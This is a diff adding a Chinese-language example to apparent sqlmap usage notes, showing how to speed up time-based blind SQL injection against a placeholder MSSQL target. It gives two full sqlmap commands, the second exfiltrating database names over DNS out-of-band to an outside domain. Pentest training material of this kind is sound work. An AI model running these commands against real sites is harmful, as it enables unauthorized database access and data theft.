@@ -378,3 +378,17 @@ Options:
     --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
     --wizard            Simple wizard interface for beginner users
 ```
+
+
+### 案例1
+
+基于时间的盲注，如何加速获取数据
+
+```
+# 基于时间的盲注 - 方法1: 根据延时来跑数据(很慢)
+python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --tech=T --dbms mssql --dbs
+
+# 基于时间的盲注 - 方法2: 使用带外请求(OOB) 利用DNS跑数据(很快)
+# 假设本机的公网ip为114.1.1.1  就在本机运行sqlmap
+python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --tech=T --dbms=mssql --dbs --dns-domain=114.1.1.1.xip.io
+```
